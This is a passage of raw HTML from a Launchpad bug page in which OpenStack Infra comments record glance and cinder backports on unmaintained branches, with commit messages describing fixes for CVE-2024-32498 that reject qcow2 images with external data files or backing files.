          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/450"> #450</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: unmaintained/yoga<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/931640">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/931640</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: unmaintained/yoga
Review: https://review.opendev.org/c/openstack/glance/+/931640</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/451" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-10-09T13:49:07.104502+00:00" title="2024-10-09 13:49:07 UTC">on 2024-10-09</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/451">
                <strong>Fix merged to glance (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/451"> #451</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/931639">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/931639</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/glance/commit/f7f7249b343bb7c1f6425a3dc11d926ecbbd40ba">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />glance/<wbr />commit/<wbr />f7f7249b343bb7c<wbr />1f6425a3dc11d92<wbr />6ecbbd40ba</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit f7f7249b343bb7c<wbr />1f6425a3dc11d92<wbr />6ecbbd40ba<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Mon Apr 1 08:06:31 2024 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Reject qcow files with data-file attributes</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I6326a3e85c1ba4<wbr />cb1da944a432376<wbr />9f2399ed2c1<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 2ca29af4433e9fa<wbr />99a0a48e230d8d2<wbr />5d6eaa4a87)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit c3586f3a122f6cb<wbr />0663217b12b5220<wbr />3e74e2e4fa)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit a92c438fb5ba554<wbr />40b38cae7c8b436<wbr />1b58daa9dd)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit dba3bdb458aa8a5<wbr />d0193f12b7f1e37<wbr />4a89ed34a2)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 6a38aef8baaf5ca<wbr />ecbd8c866f1cf92<wbr />2d939dfbcc)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/glance/+/931639
Committed: https://opendev.org/openstack/glance/commit/f7f7249b343bb7c1f6425a3dc11d926ecbbd40ba
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit f7f7249b343bb7c1f6425a3dc11d926ecbbd40ba
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Mon Apr 1 08:06:31 2024 -0700

    Reject qcow files with data-file attributes
    
    Change-Id: I6326a3e85c1ba4cb1da944a4323769f2399ed2c1
    Closes-Bug: #2059809
    (cherry picked from commit 2ca29af4433e9fa99a0a48e230d8d25d6eaa4a87)
    (cherry picked from commit c3586f3a122f6cb0663217b12b52203e74e2e4fa)
    (cherry picked from commit a92c438fb5ba55440b38cae7c8b4361b58daa9dd)
    (cherry picked from commit dba3bdb458aa8a5d0193f12b7f1e374a89ed34a2)
    (cherry picked from commit 6a38aef8baaf5caecbd8c866f1cf922d939dfbcc)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/452" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-10-09T19:13:49.818496+00:00" title="2024-10-09 19:13:49 UTC">on 2024-10-09</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/452">
                <strong>Related fix merged to glance (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/452"> #452</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/931640">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/931640</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/glance/commit/a28d96bb8ca65e50be1efea3f3c0db82eed0bb62">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />glance/<wbr />commit/<wbr />a28d96bb8ca65e5<wbr />0be1efea3f3c0db<wbr />82eed0bb62</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit a28d96bb8ca65e5<wbr />0be1efea3f3c0db<wbr />82eed0bb62<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Tue Apr 16 10:29:10 2024 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Extend format_inspector for QCOW safety</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This adds two properties to the QcowInspector that makes it able to<br />
&nbsp;&nbsp;&nbsp;&nbsp;indicate whether the file specifies a backing_file or data_file in the<br />
&nbsp;&nbsp;&nbsp;&nbsp;header. Both conditions are considered unsafe for our usage. To<br />
&nbsp;&nbsp;&nbsp;&nbsp;ease checking of this condition, a classmethod is added that takes<br />
&nbsp;&nbsp;&nbsp;&nbsp;a local filename and digests just enough of the file to assert that<br />
&nbsp;&nbsp;&nbsp;&nbsp;both conditions are false.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Note for yoga backport:With older qemu installed one of the qemu-img<br />
&nbsp;&nbsp;&nbsp;&nbsp;create commands fails, let&#x27;s skip it from unmaintained/yoga and<br />
&nbsp;&nbsp;&nbsp;&nbsp;below that.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Iaf86b525397d41<wbr />bd116999cabe095<wbr />4a0a7efac65<br />
&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit ae536bb394793c9<wbr />a7a219cb498e03d<wbr />5c81dbbbb7)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 2eba54e08211060<wbr />97dfeceb424e539<wbr />43fd090483)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 89dbbc838d606f4<wbr />61087e1494d19dd<wbr />bcf9db0a38)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 4860024286256b0<wbr />28fabc5ed502749<wbr />34c3dfdd8a)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit f32d5b8ad865113<wbr />d499a36f7507a08<wbr />5f583514f9)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/glance/+/931640
Committed: https://opendev.org/openstack/glance/commit/a28d96bb8ca65e50be1efea3f3c0db82eed0bb62
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit a28d96bb8ca65e50be1efea3f3c0db82eed0bb62
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Tue Apr 16 10:29:10 2024 -0700

    Extend format_inspector for QCOW safety
    
    This adds two properties to the QcowInspector that makes it able to
    indicate whether the file specifies a backing_file or data_file in the
    header. Both conditions are considered unsafe for our usage. To
    ease checking of this condition, a classmethod is added that takes
    a local filename and digests just enough of the file to assert that
    both conditions are false.
    
    Note for yoga backport:With older qemu installed one of the qemu-img
    create commands fails, let's skip it from unmaintained/yoga and
    below that.
    
    Change-Id: Iaf86b525397d41bd116999cabe0954a0a7efac65
    Related-Bug: #2059809
    (cherry picked from commit ae536bb394793c9a7a219cb498e03d5c81dbbbb7)
    (cherry picked from commit 2eba54e0821106097dfeceb424e53943fd090483)
    (cherry picked from commit 89dbbc838d606f461087e1494d19ddbcf9db0a38)
    (cherry picked from commit 4860024286256b028fabc5ed50274934c3dfdd8a)
    (cherry picked from commit f32d5b8ad865113d499a36f7507a085f583514f9)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/453" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-12-03T09:31:29.598568+00:00" title="2024-12-03 09:31:29 UTC">on 2024-12-03</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/453">
                <strong>Fix merged to cinder (unmaintained/xena)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/453"> #453</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/cinder/+/925097">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/cinder/<wbr />+/925097</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/cinder/commit/312d98d74490414902f3379b91b63dfa65f9b622">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />cinder/<wbr />commit/<wbr />312d98d74490414<wbr />902f3379b91b63d<wbr />fa65f9b622</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/xena</p>
<p>commit 312d98d74490414<wbr />902f3379b91b63d<wbr />fa65f9b622<br />
Author: Brian Rosmaita &lt;email address hidden&gt;<br />
Date:   Wed Jun 26 14:09:30 2024 -0400</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;CVE-2024-32498: Check for external qcow2 data file</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Adds code to image_utils to check for a qcow2 external data<br />
&nbsp;&nbsp;&nbsp;&nbsp;file, a recent feature of qemu which we do not support and<br />
&nbsp;&nbsp;&nbsp;&nbsp;which can be used maliciously.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Advice from the qemu-img community is that it is dangerous<br />
&nbsp;&nbsp;&nbsp;&nbsp;to call qemu-img info on untrusted files, so we copy over<br />
&nbsp;&nbsp;&nbsp;&nbsp;the format_inspector module from Glance.  This performs basic<br />
&nbsp;&nbsp;&nbsp;&nbsp;analysis on the image data file so we can detect problematic<br />
&nbsp;&nbsp;&nbsp;&nbsp;images before we call qemu-img info to get all the image<br />
&nbsp;&nbsp;&nbsp;&nbsp;attributes.  It is expected that this code will eventually be<br />
&nbsp;&nbsp;&nbsp;&nbsp;added to oslo so it can be consumed by Glance, Cinder, and<br />
&nbsp;&nbsp;&nbsp;&nbsp;Nova.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Because cinder itself may create qcow2 format images with a<br />
&nbsp;&nbsp;&nbsp;&nbsp;backing file in nfs-based backends, the glance format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;has been modified to optionally allow such files.  Since we are<br />
&nbsp;&nbsp;&nbsp;&nbsp;monkeying with the format_inspector code, we also copy over<br />
&nbsp;&nbsp;&nbsp;&nbsp;its unit tests to prevent regressions and to add tests for the<br />
&nbsp;&nbsp;&nbsp;&nbsp;changed code.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Includes an additional fix to prevent an issue where a user<br />
&nbsp;&nbsp;&nbsp;&nbsp;could mount a raw volume and write a qcow2 header with a larger<br />
&nbsp;&nbsp;&nbsp;&nbsp;virtual size on it. On reattaching the volume it would have the<br />
&nbsp;&nbsp;&nbsp;&nbsp;new larger virtual size avaialable without actually changing<br />
&nbsp;&nbsp;&nbsp;&nbsp;the size value in cinder.  While we cannot prevent this we can<br />
&nbsp;&nbsp;&nbsp;&nbsp;prevent the user from using this volume again, which makes this<br />
&nbsp;&nbsp;&nbsp;&nbsp;exploit pointless.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;unmaintaine<wbr />d/yoga only: The tests<br />
&nbsp;&nbsp;&nbsp;&nbsp;cinder.<wbr />tests.unit.<wbr />volume.<wbr />drivers.<wbr />test_quobyte.<wbr />QuobyteDriverTe<wbr />stCase.<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot_<wbr />not_cached_<wbr />overlay<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot_<wbr />not_cached<br />
&nbsp;&nbsp;&nbsp;&nbsp;failed as convert_image mock was not called, remove this mock<br />
&nbsp;&nbsp;&nbsp;&nbsp;from yoga and on older branches.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;With older qemu installed one of the qemu-img<br />
&nbsp;&nbsp;&nbsp;&nbsp;create commands fails, let&#x27;s skip it from unmaintained/yoga and<br />
&nbsp;&nbsp;&nbsp;&nbsp;below that in test_qcow2_<wbr />safety_<wbr />checks.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Co-authored-by: Dan Smith &lt;email address hidden&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;Co-authored-by: Felix Huettner &lt;email address hidden&gt;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I65857288b797cd<wbr />e573e7443ac6e7e<wbr />6f57fedde01<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 4aa6590a483901d<wbr />e64e0d162fff11f<wbr />3d2d7f9977)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit d6a186945e03649<wbr />343af55b46ed8df<wbr />e0dd326e40)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit db98dc207060da2<wbr />34c32a563c13cac<wbr />1edbd62952)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 9e667b02b2c20b4<wbr />ada18c1a472be15<wbr />2956284d45)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 5f5e86e35428662<wbr />27b7339713148b5<wbr />169d069f21)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 0c3c65376f1aa46<wbr />b35bedb4b59eac0<wbr />bf8cc5979e)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/cinder/+/925097
Committed: https://opendev.org/openstack/cinder/commit/312d98d74490414902f3379b91b63dfa65f9b622
Submitter: "Zuul (22348)"
Branch:    unmaintained/xena

commit 312d98d74490414902f3379b91b63dfa65f9b622
Author: Brian Rosmaita &lt;rosmaita.fossdev@gmail.com&gt;
Date:   Wed Jun 26 14:09:30 2024 -0400

    CVE-2024-32498: Check for external qcow2 data file
    
    Adds code to image_utils to check for a qcow2 external data
    file, a recent feature of qemu which we do not support and
    which can be used maliciously.
    
    Advice from the qemu-img community is that it is dangerous
    to call qemu-img info on untrusted files, so we copy over
    the format_inspector module from Glance.  This performs basic
    analysis on the image data file so we can detect problematic
    images before we call qemu-img info to get all the image
    attributes.  It is expected that this code will eventually be
    added to oslo so it can be consumed by Glance, Cinder, and
    Nova.
    
    Because cinder itself may create qcow2 format images with a
    backing file in nfs-based backends, the glance format_inspector
    has been modified to optionally allow such files.  Since we are
    monkeying with the format_inspector code, we also copy over
    its unit tests to prevent regressions and to add tests for the
    changed code.
    
    Includes an additional fix to prevent an issue where a user
    could mount a raw volume and write a qcow2 header with a larger
    virtual size on it. On reattaching the volume it would have the
    new larger virtual size avaialable without actually changing
    the size value in cinder.  While we cannot prevent this we can
    prevent the user from using this volume again, which makes this
    exploit pointless.
    
    unmaintained/yoga only: The tests
    cinder.tests.unit.volume.drivers.test_quobyte.QuobyteDriverTestCase.
    * test_copy_volume_from_snapshot_not_cached_overlay
    * test_copy_volume_from_snapshot
    * test_copy_volume_from_snapshot_not_cached
    failed as convert_image mock was not called, remove this mock
    from yoga and on older branches.
    
    With older qemu installed one of the qemu-img
    create commands fails, let's skip it from unmaintained/yoga and
    below that in test_qcow2_safety_checks.
    
    Co-authored-by: Dan Smith &lt;dansmith@redhat.com&gt;
    Co-authored-by: Felix Huettner &lt;felix.huettner@mail.schwarz&gt;
    
    Change-Id: I65857288b797cde573e7443ac6e7e6f57fedde01
    Closes-bug: #2059809
    (cherry picked from commit 4aa6590a483901de64e0d162fff11f3d2d7f9977)
    (cherry picked from commit d6a186945e03649343af55b46ed8dfe0dd326e40)
    (cherry picked from commit db98dc207060da234c32a563c13cac1edbd62952)
    (cherry picked from commit 9e667b02b2c20b4ada18c1a472be152956284d45)
    (cherry picked from commit 5f5e86e3542866227b7339713148b5169d069f21)
    (cherry picked from commit 0c3c65376f1aa46b35bedb4b59eac0bf8cc5979e)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-unmaintained-xena
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/454" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-12-06T10:54:29.577946+00:00" title="2024-12-06 10:54:29 UTC">on 2024-12-06</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/454">
                <strong>Fix merged to cinder (unmaintained/wallaby)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/454"> #454</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/nova/+bug/2059809/comments/454/+download">Download full text</a> (3.2 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/cinder/+/925098">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/cinder/<wbr />+/925098</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/cinder/commit/9875e4bc1d6b21be24253a52b5e40deb24748744">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />cinder/<wbr />commit/<wbr />9875e4bc1d6b21b<wbr />e24253a52b5e40d<wbr />eb24748744</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/<wbr />wallaby</p>
<p>commit 9875e4bc1d6b21b<wbr />e24253a52b5e40d<wbr />eb24748744<br />
Author: Brian Rosmaita &lt;email address hidden&gt;<br />
Date:   Wed Jun 26 14:09:30 2024 -0400</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;CVE-2024-32498: Check for external qcow2 data file</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Adds code to image_utils to check for a qcow2 external data<br />
&nbsp;&nbsp;&nbsp;&nbsp;file, a recent feature of qemu which we do not support and<br />
&nbsp;&nbsp;&nbsp;&nbsp;which can be used maliciously.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Advice from the qemu-img community is that it is dangerous<br />
&nbsp;&nbsp;&nbsp;&nbsp;to call qemu-img info on untrusted files, so we copy over<br />
&nbsp;&nbsp;&nbsp;&nbsp;the format_inspector module from Glance.  This performs basic<br />
&nbsp;&nbsp;&nbsp;&nbsp;analysis on the image data file so we can detect problematic<br />
&nbsp;&nbsp;&nbsp;&nbsp;images before we call qemu-img info to get all the image<br />
&nbsp;&nbsp;&nbsp;&nbsp;attributes.  It is expected that this code will eventually be<br />
&nbsp;&nbsp;&nbsp;&nbsp;added to oslo so it can be consumed by Glance, Cinder, and<br />
&nbsp;&nbsp;&nbsp;&nbsp;Nova.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Because cinder itself may create qcow2 format images with a<br />
&nbsp;&nbsp;&nbsp;&nbsp;backing file in nfs-based backends, the glance format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;has been modified to optionally allow such files.  Since we are<br />
&nbsp;&nbsp;&nbsp;&nbsp;monkeying with the format_inspector code, we also copy over<br />
&nbsp;&nbsp;&nbsp;&nbsp;its unit tests to prevent regressions and to add tests for the<br />
&nbsp;&nbsp;&nbsp;&nbsp;changed code.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Includes an additional fix to prevent an issue where a user<br />
&nbsp;&nbsp;&nbsp;&nbsp;could mount a raw volume and write a qcow2 header with a larger<br />
&nbsp;&nbsp;&nbsp;&nbsp;virtual size on it. On reattaching the volume it would have the<br />
&nbsp;&nbsp;&nbsp;&nbsp;new larger virtual size avaialable without actually changing<br />
&nbsp;&nbsp;&nbsp;&nbsp;the size value in cinder.  While we cannot prevent this we can<br />
&nbsp;&nbsp;&nbsp;&nbsp;prevent the user from using this volume again, which makes this<br />
&nbsp;&nbsp;&nbsp;&nbsp;exploit pointless.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;unmaintaine<wbr />d/yoga only: The tests<br />
&nbsp;&nbsp;&nbsp;&nbsp;cinder.<wbr />tests.unit.<wbr />volume.<wbr />drivers.<wbr />test_quobyte.<wbr />QuobyteDriverTe<wbr />stCase.<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot_<wbr />not_cached_<wbr />overlay<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot<br />
&nbsp;&nbsp;&nbsp;&nbsp;* test_copy_<wbr />volume_<wbr />from_snapshot_<wbr />not_cached<br />
&nbsp;&nbsp;&nbsp;&nbsp;failed as convert_image mock was not called, remove this mock<br />
&nbsp;&nbsp;&nbsp;&nbsp;from yoga and on older branches.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;With older qemu installed one of the qemu-img<br />
&nbsp;&nbsp;&nbsp;&nbsp;create commands fails, let&#x27;s skip it from unmaintained/yoga and<br />
&nbsp;&nbsp;&nbsp;&nbsp;below that in test_qcow2_<wbr />safety_<wbr />checks.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Co-authored-by: Dan Smith &lt;email address hidden&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;Co-authored-by: Felix Huettner &lt;email address hidden&gt;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Conflicts:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cinder/<wbr />image/image_<wbr />utils.py</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;NOTE(<wbr />elod.illes)<wbr />: conflict is due to mypy patch was added in xena only:<br />
&nbsp;&nbsp;&nbsp;&nbsp;Ib32e58125b<wbr />e3a2b6d05488807<wbr />c83d48e920cf57d</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I65857288b797cd<wbr />e573e7443ac6e7e<wbr />6f57fedde01<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 4aa6590a483901d<wbr />e64e0d162fff11f<wbr />3d2d7f9977)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit d6a186945e03649<wbr />343af55b46ed8df<wbr />e0dd326e40)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit db98dc207060da2<wbr />34c32a563c13cac<wbr />1edbd62952)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 9e667b02b2c20b4<wbr />ada18c1a472be15<wbr />2956284d45)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 5f5e86e35428662<wbr />27b7339713148b5<wbr />169d069f21)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 0c3c65376f1aa46<wbr />b35bedb4b59eac0<wbr />bf8cc5979e)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked ...</p></div>
    
    <p>
      <a href="/nova/+bug/2059809/comments/454">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/cinder/+/925098
Committed: https://opendev.org/openstack/cinder/commit/9875e4bc1d6b21be24253a52b5e40deb24748744
Submitter: "Zuul (22348)"
Branch:    unmaintained/wallaby

commit 9875e4bc1d6b21be24253a52b5e40deb24748744
Author: Brian Rosmaita &lt;rosmaita.fossdev@gmail.com&gt;
Date:   Wed Jun 26 14:09:30 2024 -0400

    CVE-2024-32498: Check for external qcow2 data file
    
    Adds code to image_utils to check for a qcow2 external data
    file, a recent feature of qemu which we do not support and
    which can be used maliciously.
    
    Advice from the qemu-img community is that it is dangerous
    to call qemu-img info on untrusted files, so we copy over
